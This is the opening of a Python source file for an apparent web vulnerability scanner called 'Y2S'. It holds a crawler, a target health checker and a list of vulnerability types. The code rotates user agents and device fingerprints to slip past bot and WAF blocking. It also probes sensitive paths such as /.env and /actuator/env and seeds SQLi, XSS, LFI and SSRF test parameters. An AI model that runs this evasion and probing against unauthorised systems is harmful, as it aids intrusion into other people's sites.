#!/usr/bin/env python3
import os
import sys
import json
import time
import uuid
import base64
import hashlib
import asyncio
import re
import urllib.parse
from pathlib import Path
from typing import List, Dict, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime

try:
    import httpx
    from bs4 import BeautifulSoup
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.panel import Panel
    from rich import box
    from rich.tree import Tree
except ImportError:
    print("Missing dependencies. Install with: pip install httpx rich beautifulsoup4")
    sys.exit(1)

import random
import math
import struct
import socket
import itertools
import statistics

_USER_AGENTS = [
    # ── Windows Desktop ───────────────────────────────────────────────────────
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Vivaldi/6.6.3271.57",
    # ── macOS Desktop ─────────────────────────────────────────────────────────
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.4; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    # ── Linux Desktop ─────────────────────────────────────────────────────────
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    # ── Android Mobile ────────────────────────────────────────────────────────
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36 SamsungBrowser/24.0",
    "Mozilla/5.0 (Linux; Android 13; SM-A546E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
    # ── iOS Mobile ────────────────────────────────────────────────────────────
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/124.0.6367.88 Mobile/15E148 Safari/604.1",
    # ── Tablet ────────────────────────────────────────────────────────────────
    "Mozilla/5.0 (iPad; CPU OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-X716B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Safari/537.36",
    # ── Bots / Tools (for WAF bypass testing) ─────────────────────────────────
    "python-requests/2.31.0",
    "curl/8.6.0",
    "Go-http-client/2.0",
    "Wget/1.21.4",
]

_ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9,en-US;q=0.8",
    "ar-EG,ar;q=0.9,en;q=0.8",
    "ar-SA,ar;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "tr-TR,tr;q=0.9,en;q=0.8",
]

_ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
]

# Per-session device fingerprint — regenerated each time scanner starts
_session_device_id: str = str(uuid.uuid4())
_session_fingerprint: str = hashlib.sha256(uuid.uuid4().bytes).hexdigest()[:16]

_custom_ua: Optional[str] = None

def rotate_device() -> None:
    """Regenerate session-level device identifiers (call between scan targets)."""
    global _session_device_id, _session_fingerprint
    _session_device_id  = str(uuid.uuid4())
    _session_fingerprint = hashlib.sha256(uuid.uuid4().bytes).hexdigest()[:16]

def random_headers(include_device_hints: bool = True) -> dict:
    """Return a randomised, realistic browser header set with device fingerprinting."""
    ua = _custom_ua or random.choice(_USER_AGENTS)

    hdrs: dict = {
        "User-Agent":               ua,
        "Accept":                   random.choice(_ACCEPT_HEADERS),
        "Accept-Language":          random.choice(_ACCEPT_LANGS),
        "Accept-Encoding":          random.choice(["gzip, deflate, br", "gzip, deflate", "gzip, deflate, br, zstd"]),
        "Connection":               "keep-alive",
    }

    # Mobile UAs get mobile-specific headers
    _is_mobile = any(m in ua for m in ["Mobile", "Android", "iPhone", "iPad"])
    if _is_mobile:
        hdrs["Upgrade-Insecure-Requests"] = "1"
        hdrs["Sec-Fetch-Site"]  = random.choice(["same-origin", "none", "cross-site"])
        hdrs["Sec-Fetch-Mode"]  = "navigate"
        hdrs["Sec-Fetch-User"]  = "?1"
        hdrs["Sec-Fetch-Dest"]  = "document"
    else:
        hdrs["Upgrade-Insecure-Requests"] = "1"
        hdrs["Sec-Fetch-Site"]  = random.choice(["same-origin", "none"])
        hdrs["Sec-Fetch-Mode"]  = "navigate"
        hdrs["Sec-Fetch-User"]  = "?1"
        hdrs["Sec-Fetch-Dest"]  = "document"
        # Chromium browsers send sec-ch-ua hints
        if "Chrome" in ua or "Edg" in ua:
            chrome_ver = re.search(r"Chrome/(\d+)", ua)
            if chrome_ver:
                v = chrome_ver.group(1)
                hdrs["sec-ch-ua"]          = f'"Chromium";v="{v}", "Not:A-Brand";v="8"'
                hdrs["sec-ch-ua-mobile"]   = "?0"
                hdrs["sec-ch-ua-platform"] = random.choice(['"Windows"', '"macOS"', '"Linux"'])

    if include_device_hints:
        # Rotating UUID-based device/session identifiers
        # These are added randomly to simulate different browsers/apps
        _extras = {
            "X-Device-ID":          _session_device_id,
            "X-Request-ID":         str(uuid.uuid4()),
            "X-Correlation-ID":     f"y2s-{_session_fingerprint}",
        }
        # Only add a random subset to avoid looking identical every request
        for k, v in random.sample(list(_extras.items()), k=random.randint(0, len(_extras))):
            hdrs[k] = v

    if _custom_request_headers:
        hdrs.update(_custom_request_headers)
    return hdrs

_custom_request_headers: dict = {}

def apply_config_headers(config) -> None:
    global _custom_request_headers
    _custom_request_headers = dict(config.custom_request_headers or {})
    if config.scope_header_name and config.scope_header_value:
        _custom_request_headers[config.scope_header_name] = config.scope_header_value


def beep(n=1):
    import subprocess
    for _ in range(n):
        sys.stdout.write('\a')
        sys.stdout.flush()
        try:
            subprocess.run(
                ['termux-vibrate', '-d', '300'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=1
            )
        except Exception:
            pass
        time.sleep(0.3)

class WebCrawler:
    """
    Multi-strategy async web crawler.
    Discovers: links, forms, API endpoints, params, JS URLs, robots.txt,
    sitemap.xml, Link headers, response-header hints, common paths.
    """

    _COMMON_PATHS = [
        "/login", "/signin", "/signup", "/register", "/logout",
        "/admin", "/admin/login", "/admin/dashboard", "/dashboard",
        "/panel", "/cpanel", "/administrator",
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/api/users", "/api/user", "/api/login", "/api/register",
        "/api/auth", "/api/token", "/api/refresh",
        "/api/profile", "/api/account", "/api/settings",
        "/api/products", "/api/orders", "/api/payments",
        "/api/search", "/api/upload", "/api/files",
        "/graphql", "/graphql/", "/api/graphql",
        "/search", "/profile", "/account", "/settings",
        "/user", "/users", "/users/me",
        "/upload", "/uploads", "/files", "/media", "/assets",
        "/contact", "/about", "/blog",
        "/products", "/product", "/shop",
        "/cart", "/checkout", "/orders", "/order",
        "/forgot-password", "/reset-password",
        "/verify", "/otp", "/2fa",
        "/config", "/debug", "/test",
        "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
        "/.well-known/openid-configuration",
        "/.well-known/jwks.json",
        "/ws", "/websocket", "/socket.io",
        "/swagger", "/swagger.json", "/swagger.yaml",
        "/api-docs", "/openapi.json",
        "/health", "/healthz", "/ping", "/status",
        "/metrics", "/actuator", "/actuator/env",
        "/console", "/h2-console", "/telescope",
        "/phpinfo.php", "/.env", "/wp-login.php",
    ]

    _INTERESTING_PARAMS = {
        'injection': ['q','search','query','id','user','username','email',
                      'page','file','path','url','src','redirect','next',
                      'name','type','category','filter','sort','order'],
        'sqli':      ['id','user_id','product_id','order_id','category_id',
                      'page','offset','limit'],
        'xss':       ['q','search','query','name','message','comment',
                      'title','description','content'],
        'lfi':       ['file','page','path','include','template','doc',
                      'view','load','lang'],
        'ssrf':      ['url','uri','src','source','dest','redirect','callback',
                      'proxy','endpoint','webhook'],
        'idor':      ['id','user_id','account_id','order_id','profile_id',
                      'document_id'],
    }

    def __init__(self, console, max_depth: int = 3, max_urls: int = 200):
        self.console   = console
        self.max_depth = max_depth
        self.max_urls  = max_urls
        self._visited:    set = set()  # URL strings
        self._content_hashes: set = set()  # SHA256 of response bodies
        self._found:      list = []
        self._sem         = asyncio.Semaphore(15)

    async def crawl(self, base_url: str) -> list:
        self._visited.clear()
        self._found.clear()
        self._content_hashes.clear()

        parsed      = urllib.parse.urlparse(base_url)
        base_origin = f"{parsed.scheme}://{parsed.netloc}"

        self.console.print(f"\n[bold cyan]🕷 Crawling {base_url} ...[/bold cyan]")

        async with httpx.AsyncClient(
            headers=random_headers(), verify=False,
            follow_redirects=True, timeout=12
        ) as client:

            # ── Step 0: robots.txt + sitemap.xml ─────────────────────────────
            await self._parse_robots(client, base_origin)
            await self._parse_sitemap(client, base_origin)

            # ── Step 1: Recursive HTML crawl ─────────────────────────────────
            await self._crawl_page(client, base_url, base_origin, depth=0)

            # ── Step 2: Parallel common-path probing ─────────────────────────
            self.console.print(f"[dim]  Probing {len(self._COMMON_PATHS)} common paths...[/dim]")
            await asyncio.gather(
                *[self._probe_path(client, base_origin + p)
                  for p in self._COMMON_PATHS
                  if base_origin + p not in self._visited],
                return_exceptions=True
            )

            # ── Step 3: JS URL extraction from homepage ───────────────────────
            try:
                r = await client.get(base_url, timeout=10)
                for jurl in self._extract_js_urls(r.text, base_origin)[:40]:
                    if jurl not in self._visited:
                        self._visited.add(jurl)
                        pj = urllib.parse.urlparse(jurl)
                        params = {k: v[0] for k, v in
                                  urllib.parse.parse_qs(pj.query).items()}
                        if params:
                            self._found.append({'url': jurl, 'params': params,
                                                'forms': [], 'source': 'js_extracted'})
                # ── Step 3b: Discover endpoints from response headers ─────────
                self._extract_header_hints(r.headers, base_origin)
            except Exception:
                pass

            # ── Step 4: Inject interesting params on discovered paths ─────────
            seed_urls = list({f['url'].split('?')[0] for f in self._found} |
                              {base_url.split('?')[0]})
            for seed in seed_urls[:50]:
                for category, param_list in self._INTERESTING_PARAMS.items():
                    injected = {p: f"y2s_test_{p}" for p in param_list}
                    tu = seed + '?' + urllib.parse.urlencode(injected)
                    if tu not in self._visited:
                        self._found.append({'url': tu, 'params': injected,
                                            'forms': [], 'source': f'param_injection:{category}'})

        # ── Dedup by URL ──────────────────────────────────────────────────────
        seen = set()
        unique = []
        for item in self._found:
            key = item['url']
            if key not in seen:
                seen.add(key)
                unique.append(item)

        unique = unique[:self.max_urls]
        self.console.print(
            f"[green]  ✓ Crawl complete: {len(unique)} URLs | "
            f"{sum(len(i['params']) for i in unique)} params | "
            f"{sum(len(i['forms']) for i in unique)} form fields[/green]\n"
        )
        try:
            self._save_crawl_results(unique, base_origin)
        except Exception:
            pass
        return unique

    def _save_crawl_results(self, results: list, origin: str) -> None:
        domain = urllib.parse.urlparse(origin).netloc.replace(":", "_").replace("www.", "")
        base   = (Path("/sdcard") if Path("/sdcard").exists()
                  else Path.home() / "Desktop" if (Path.home() / "Desktop").exists()
                  else Path.home())
        crawler_dir = base / "Y2S" / "crawler"
        crawler_dir.mkdir(parents=True, exist_ok=True)
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = crawler_dir / f"{domain}_{ts}.txt"
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"# Y2S Crawler Output\n")
            f.write(f"# Target : {origin}\n")
            f.write(f"# Time   : {datetime.now().isoformat()}\n")
            f.write(f"# URLs   : {len(results)}\n\n")
            for item in results:
                f.write(f"{item['url']}\n")
                if item.get('params'):
                    f.write(f"  Params : {', '.join(item['params'].keys())}\n")
                for form in item.get('forms', []):
                    f.write(f"  Form   : {form.get('method','GET')} {form.get('action','')}\n")
                f.write(f"  Source : {item.get('source','')}\n\n")
        self.console.print(f"[dim]  Crawler → {path}[/dim]")

    async def _parse_robots(self, client, origin: str):
        """Parse robots.txt — extract Disallow/Allow paths as scan targets."""
        try:
            r = await client.get(f"{origin}/robots.txt", timeout=6)
            if r.status_code == 200:
                paths = re.findall(r'(?:Disallow|Allow):\s*(/\S+)', r.text)
                for p in paths[:50]:
                    url = origin + p.split('?')[0]  # strip query
                    if url not in self._visited and '*' not in url:
                        self._visited.add(url)
                        self._found.append({'url': url, 'params': {}, 'forms': [],
                                            'source': 'robots_txt'})
        except Exception:
            pass

    async def _parse_sitemap(self, client, origin: str):
        """Parse sitemap.xml — extract <loc> URLs."""
        for sitemap in ['/sitemap.xml', '/sitemap_index.xml']:
            try:
                r = await client.get(origin + sitemap, timeout=8)
                if r.status_code == 200 and 'xml' in r.headers.get('content-type', ''):
                    locs = re.findall(r'<loc>([^<]+)</loc>', r.text)
                    for loc in locs[:80]:
                        pu = urllib.parse.urlparse(loc)
                        if pu.netloc != urllib.parse.urlparse(origin).netloc:
                            continue
                        params = {k: v[0] for k, v in
                                  urllib.parse.parse_qs(pu.query).items()}
                        if loc not in self._visited:
                            self._visited.add(loc)
                            self._found.append({'url': loc, 'params': params,
                                                'forms': [], 'source': 'sitemap'})
            except Exception:
                pass

    def _extract_header_hints(self, headers: dict, origin: str):
        """Discover API endpoints from response headers."""
        for hdr, val in headers.items():
            h = hdr.lower()
            # Link: <https://api.example.com/v1>; rel="service"
            if h == 'link':
                for m in re.finditer(r'<([^>]+)>', val):
                    url = urllib.parse.urljoin(origin, m.group(1))
                    if urllib.parse.urlparse(url).netloc == urllib.parse.urlparse(origin).netloc:
                        if url not in self._visited:
                            self._visited.add(url)
                            self._found.append({'url': url, 'params': {},
                                                'forms': [], 'source': 'link_header'})
            # X-API-Version, API-Endpoint hints
            if h in ('x-api-version', 'api-version'):
                ver_url = f"{origin}/api/v{val.strip()}"
                if ver_url not in self._visited:
                    self._found.append({'url': ver_url, 'params': {},
                                        'forms': [], 'source': 'api_version_header'})

    async def _crawl_page(self, client, url: str, origin: str, depth: int):
        if depth > self.max_depth or url in self._visited or len(self._visited) >= self.max_urls:
            return
        self._visited.add(url)

        async with self._sem:
            try:
                r = await client.get(url, timeout=10)
                if r.status_code not in (200, 201, 400, 401, 403, 405):
                    return
                ct = r.headers.get('content-type', '')
                if 'html' not in ct and 'json' not in ct:
                    return

                # Content-hash dedup — don't re-scan identical pages
                chash = hashlib.md5(r.content).hexdigest()
                if chash in self._content_hashes:
                    return
                self._content_hashes.add(chash)

                parsed = urllib.parse.urlparse(url)
                params = {k: v[0] for k, v in
                          urllib.parse.parse_qs(parsed.query).items()}
                forms  = self._extract_forms(r.text, url, origin)

                if params or forms:
                    self._found.append({'url': url, 'params': params,
                                        'forms': forms, 'source': 'crawl'})

                # Discover hints from response headers
                self._extract_header_hints(r.headers, origin)

                # Recurse into links
                links = self._extract_links(r.text, url, origin)
                await asyncio.gather(
                    *[self._crawl_page(client, lnk, origin, depth + 1) for lnk in links],
                    return_exceptions=True
                )

                if 'json' in ct:
                    try:
                        data = r.json()
                        for ju in self._extract_urls_from_json(data, origin)[:10]:
                            await self._crawl_page(client, ju, origin, depth + 1)
                    except Exception:
                        pass

            except Exception:
                pass

    async def _probe_path(self, client, url: str):
        if url in self._visited:
            return
        self._visited.add(url)
        async with self._sem:
            try:
                r = await client.get(url, timeout=6)
                if r.status_code in (200, 201, 400, 401, 403, 405, 422):
                    parsed = urllib.parse.urlparse(url)
                    params = {k: v[0] for k, v in
                              urllib.parse.parse_qs(parsed.query).items()}
                    forms  = self._extract_forms(r.text, url,
                                                 f"{parsed.scheme}://{parsed.netloc}")
                    self._found.append({'url': url, 'params': params,
                                        'forms': forms, 'source': 'path_probe',
                                        'status': r.status_code})
            except Exception:
                pass

    def _extract_links(self, html: str, base_url: str, origin: str) -> list:
        links = []
        origin_netloc = urllib.parse.urlparse(origin).netloc
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, 'html.parser')
            for tag in soup.find_all(['a', 'link', 'area'], href=True):
                href = tag['href']
                full = urllib.parse.urljoin(base_url, href)
                p    = urllib.parse.urlparse(full)
                if p.netloc == origin_netloc:
                    clean = urllib.parse.urlunparse(
                        (p.scheme, p.netloc, p.path, '', p.query, ''))
                    if clean and clean not in self._visited:
                        links.append(clean)
            # Also pick up action attributes (forms)
            for tag in soup.find_all(action=True):
                full = urllib.parse.urljoin(base_url, tag['action'])
                p    = urllib.parse.urlparse(full)
                if p.netloc == origin_netloc and full not in self._visited:
                    links.append(full)
        except Exception:
            for m in re.finditer(r'href=["\']([^"\']+)["\']', html):
                full = urllib.parse.urljoin(base_url, m.group(1))
                p    = urllib.parse.urlparse(full)
                if p.netloc == origin_netloc:
                    links.append(full)
        return links[:60]

    def _extract_forms(self, html: str, base_url: str, origin: str) -> list:
        forms_data = []
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html, 'html.parser')
            for form in soup.find_all('form'):
                action = form.get('action', base_url)
                method = form.get('method', 'GET').upper()
                full_action = urllib.parse.urljoin(base_url, action)
                fields = {}
                for inp in form.find_all(['input', 'textarea', 'select']):
                    name = inp.get('name')
                    if name:
                        fields[name] = inp.get('value', 'test')
                if fields:
                    forms_data.append({'action': full_action,
                                       'method': method, 'fields': fields})
        except Exception:
            pass
        return forms_data

    def _extract_js_urls(self, html: str, origin: str) -> list:
        urls = []
        origin_netloc = urllib.parse.urlparse(origin).netloc
        patterns = [
            r'["\'](/api/[^"\'?\s]{1,100})',
            r'["\'](/v\d+/[^"\'?\s]{1,100})',
            r'["\'](' + re.escape(origin) + r'/[^"\'?\s]{1,100})',
            r'fetch\s*\(\s*["\']([^"\']{4,150})["\']',
            r'axios\.\w+\s*\(\s*["\']([^"\']{4,150})["\']',
            r'(?:url|endpoint|path|href)\s*[:=]\s*["\']([^"\']{4,150})["\']',
            r'["\'](\/[\w\-\/]+\?[\w=&]+)["\']',  # paths with query strings
        ]
        for pat in patterns:
            for m in re.finditer(pat, html):
                full = urllib.parse.urljoin(origin, m.group(1))
                p    = urllib.parse.urlparse(full)
                if p.netloc == origin_netloc and full not in urls:
                    urls.append(full)
        return urls[:60]

    def _extract_urls_from_json(self, data, origin: str) -> list:
        urls = []
        origin_netloc = urllib.parse.urlparse(origin).netloc

        def _walk(obj):
            if isinstance(obj, str) and len(obj) > 4 and obj.startswith(('http', '/')):
                full = urllib.parse.urljoin(origin, obj)
                p    = urllib.parse.urlparse(full)
                if p.netloc == origin_netloc:
                    urls.append(full)
            elif isinstance(obj, dict):
                for v in obj.values(): _walk(v)
            elif isinstance(obj, list):
                for v in obj: _walk(v)

        _walk(data)
        return urls[:25]

    def get_all_scan_urls(self, crawl_results: list) -> list:
        scan_targets = []
        seen = set()
        for item in crawl_results:
            url    = item['url']
            params = item.get('params', {})
            forms  = item.get('forms', [])
            if url not in seen and (params or '?' in url):
                seen.add(url)
                scan_targets.append(url)
            for form in forms:
                furl = form.get('action', url)
                if furl and furl not in seen:
                    seen.add(furl)
                    if form.get('method') == 'GET':
                        fq = urllib.parse.urlencode(form.get('fields', {}))
                        scan_targets.append(f"{furl}?{fq}" if fq else furl)
                    else:
                        scan_targets.append(furl)
        return scan_targets


class TargetHealthChecker:
    """
    Runs before any scan to verify the target is reachable, responsive,
    and hasn't blocked us. Detects: timeouts, bans (403/429/503),
    captcha pages, rate-limiting, slow responses, and connection errors.
    """

    # Responses strongly indicating a ban or WAF block
    _BAN_STATUS_CODES = {403, 406, 429, 503, 521, 522, 523, 524}

    # Strings in body that signal captcha / WAF / ban pages
    _BAN_BODY_PATTERNS = [
        r"access denied",
        r"you have been blocked",
        r"your ip.*blocked",
        r"bot.*detected",
        r"cloudflare.*attention required",
        r"ray id:",                          # Cloudflare block page
        r"ddos.*protection",
        r"please verify.*human",
        r"captcha",
        r"incapsula",
        r"sucuri webiste firewall",
        r"mod_security",
        r"request blocked",
        r"403 forbidden",
        r"ip.*ban",
        r"too many requests",
    ]

    def __init__(self, console):
        self.console = console

    async def check(self, url: str, timeout: float = 10.0) -> dict:
        """
        Returns dict with keys:
          ok        : bool  — True = safe to scan
          status    : str   — 'ok' | 'timeout' | 'ban' | 'slow' | 'error' | 'captcha'
          message   : str   — human-readable description
          latency   : float — response time in seconds (-1 if failed)
          proceed   : bool  — user chose to continue anyway
        """
        result = {"ok": False, "status": "error", "message": "", "latency": -1.0, "proceed": False}

        self.console.print(f"\n[dim]🔍 Checking target health: {url}[/dim]")

        # ── 3 probes for reliability ──────────────────────────────────────────
        latencies = []
        last_status = None
        last_body   = ""
        last_error  = None

        async with httpx.AsyncClient(
            headers=random_headers(), verify=False,
            follow_redirects=True
        ) as client:
            for probe_num in range(3):
                try:
                    t0 = time.monotonic()
                    resp = await client.get(url, timeout=timeout)
                    elapsed = time.monotonic() - t0
                    latencies.append(elapsed)
                    last_status = resp.status_code
                    last_body   = resp.text[:3000].lower()
                except httpx.TimeoutException:
                    latencies.append(timeout)
                    last_error = "timeout"
                except httpx.ConnectError as e:
                    last_error = f"connection error: {e}"
                    break
                except Exception as e:
                    last_error = str(e)
                    break
                await asyncio.sleep(0.4)

        avg_latency = sum(latencies) / len(latencies) if latencies else -1
        result["latency"] = round(avg_latency, 2)

        # ── Evaluate results ──────────────────────────────────────────────────

        # 1. Full timeout on all probes
        if last_error == "timeout" or (latencies and all(l >= timeout * 0.9 for l in latencies)):
            result["status"]  = "timeout"
            result["message"] = (
                f"⏱ Target timed out on all probes (avg {avg_latency:.1f}s). "
                "Network may be slow, the server unreachable, or you've been rate-limited."
            )
            return self._ask_user(result)

        # 2. Connection error
        if last_error and last_error != "timeout":
            result["status"]  = "error"
            result["message"] = f"❌ Cannot connect to target: {last_error}"
            return self._ask_user(result)

        # 3. Ban / WAF status code
        if last_status in self._BAN_STATUS_CODES:
            result["status"]  = "ban"
            result["message"] = (
                f"🚫 Target returned HTTP {last_status} — "
                f"{'Too Many Requests / Rate Limited' if last_status == 429 else 'Access Denied / WAF Block'}. "
                "Scan results will likely be unreliable (all Clean = False Negatives)."
            )
            return self._ask_user(result)

        # 4. Captcha / ban page in body
        for pat in self._BAN_BODY_PATTERNS:
            if re.search(pat, last_body, re.IGNORECASE):
                result["status"]  = "captcha"
                result["message"] = (
                    f"🤖 Ban / captcha page detected (matched: '{pat}'). "
                    "The server is blocking automated requests — results will be unreliable."
                )
                return self._ask_user(result)

        # 5. Very slow response (all probes > 5s)
        if latencies and all(l > 5.0 for l in latencies):
            result["status"]  = "slow"
            result["message"] = (
                f"🐢 Target is responding very slowly (avg {avg_latency:.1f}s per request). "
                "Time-based detections (SQLi/RCE/SSRF) may produce false positives or miss real issues."
            )
            return self._ask_user(result)

        # 6. Inconsistent responses (possible rate-limiting starting)
        if len(latencies) >= 2:
            max_l = max(latencies)
            min_l = min(latencies)
            if max_l > 0 and (max_l / max(min_l, 0.01)) > 5 and max_l > 3.0:
                result["status"]  = "slow"
                result["message"] = (
                    f"⚠ Inconsistent response times ({min_l:.1f}s – {max_l:.1f}s). "
                    "Server may be starting to rate-limit or throttle requests."
                )
                return self._ask_user(result)

        # ── All good ──────────────────────────────────────────────────────────
        result["ok"]      = True
        result["status"]  = "ok"
        result["proceed"] = True
        result["message"] = f"✓ Target healthy (avg latency: {avg_latency:.2f}s, HTTP {last_status})"
        self.console.print(f"[green]{result['message']}[/green]\n")
        return result

    def _ask_user(self, result: dict) -> dict:
        """Show warning and ask user whether to proceed."""
        color = {"ban": "red", "captcha": "red", "timeout": "yellow",
                 "slow": "yellow", "error": "red"}.get(result["status"], "yellow")
        self.console.print(f"\n[{color}]{result['message']}[/{color}]")
        self.console.print("[dim]Scan results may be inaccurate or entirely misleading.[/dim]")
        self.console.print("[bold]Proceed anyway? (y/n): [/bold]", end="")
        ans = input().strip().lower()
        result["proceed"] = ans in ("y", "yes", "")
        if result["proceed"]:
            self.console.print("[yellow]⚠ Continuing scan — treat results with caution.[/yellow]\n")
        else:
            self.console.print("[cyan]Scan cancelled.[/cyan]\n")
        return result


class Verdict(Enum):
    SAFE = "SAFE"
    SUSPICIOUS = "SUSPICIOUS"
    MALICIOUS = "MALICIOUS"
    VULNERABLE = "VULNERABLE"
    UNKNOWN = "UNKNOWN"

class VulnerabilityType(Enum):
    SQLI       = "SQL Injection"
    XSS        = "Cross-Site Scripting"
    IDOR       = "Insecure Direct Object Reference"
    CSRF       = "Cross-Site Request Forgery"
    RCE        = "Remote Code Execution"
    LFI        = "Local File Inclusion"
    RFI        = "Remote File Inclusion"
    SSRF       = "Server-Side Request Forgery"
    FILEUPLOAD = "File Upload Vulnerability"
    SECMISCONF = "Security Misconfiguration"
    SDTAKEOVER   = "Subdomain Takeover"
    MALWARE      = "Malware"
    PHISHING     = "Phishing"
    OPEN_REDIRECT= "Open Redirect"
    CORS         = "CORS Misconfiguration"
    HOSTHEADER   = "Host Header Injection"
    XXE          = "XML External Entity"
    DIRLIST      = "Directory Listing"
    JWT          = "JWT Vulnerability"
    GRAPHQL      = "GraphQL Misconfiguration"
    PROTOTYPE    = "Prototype Pollution"
    CRLF         = "CRLF Injection"
    DESERIAL     = "Insecure Deserialization"
    BIZLOGIC     = "Business Logic"
    RACE         = "Race Condition"
    CLICKJACKING = "Clickjacking"
    SENSITIVE    = "Sensitive Data Exposure"
    HPP          = "HTTP Parameter Pollution"
    ENUM         = "Account Enumeration"
    MFA_BYPASS   = "2FA / OTP Bypass"
    SMUGGLING    = "HTTP Request Smuggling"
    SSTI         = "Server-Side Template Injection"
    NOSQLI       = "NoSQL Injection"
    MASSASSIGN   = "Mass Assignment"
    JWT_CONF     = "JWT Algorithm Confusion"
    CACHE_POISON = "Web Cache Poisoning"
    WEBSOCKET    = "WebSocket Injection"
    PATH_TRAV    = "Path Traversal"
    API_ABUSE    = "API Versioning Abuse"
    BOPLA        = "Broken Object Property Level Auth"
    LDAP_INJ     = "LDAP Injection"
    XML_INJ      = "XML Injection"
    VERB_TAMPER  = "HTTP Verb Tampering"
    SHELLSHOCK   = "Shellshock (CVE-2014-6271)"
    LOG4SHELL    = "Log4Shell (CVE-2021-44228)"
    SPRING4SHELL = "Spring4Shell (CVE-2022-22965)"
    SSI          = "Server-Side Include Injection"
    CSTI         = "Client-Side Template Injection"
    # ── Extended VulnTypes (new scanners) ─────────────────────────────────────
    OAUTH_MISC   = "OAuth Misconfiguration"
    OAUTH_CSRF   = "OAuth CSRF / State Bypass"
    BROKEN_AUTH  = "Broken Authentication"
    TLS_ISSUE    = "TLS/SSL Misconfiguration"
    WPVULN       = "WordPress Vulnerability"
